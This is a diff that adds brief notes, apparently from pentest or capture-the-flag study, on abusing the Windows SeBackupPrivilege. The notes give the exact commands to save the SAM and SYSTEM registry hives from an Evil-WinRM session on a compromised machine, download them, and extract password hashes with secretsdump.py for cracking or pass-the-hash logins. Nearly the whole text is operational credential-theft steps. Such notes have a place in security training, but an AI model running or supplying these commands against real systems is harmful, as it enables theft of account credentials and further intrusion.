@@ -1,0 +1,17 @@
+1. after enumming privs after running a command like whoami /priv, you will see a list of privs and the state theyre in. you can exploit SeBackupPrivilege.
+
+2. run these 4 commands on the compromised machine.
+
+  *Evil-WinRM* PS C:\programdata> reg save hklm\sam samm
+
+  *Evil-WinRM* PS C:\programdata> reg save hklm\system system
+
+  *Evil-WinRM* PS C:\programdata> download sam
+
+  *Evil-WinRM* PS C:\programdata> download system
+
+3. next, run this command from the directory with the downloaded files.
+
+  kali@kali$ secretsdump.py -sam sam -system system LOCAL
+
+  ## this should dump hashes, attempt auth with hashes or crack them.
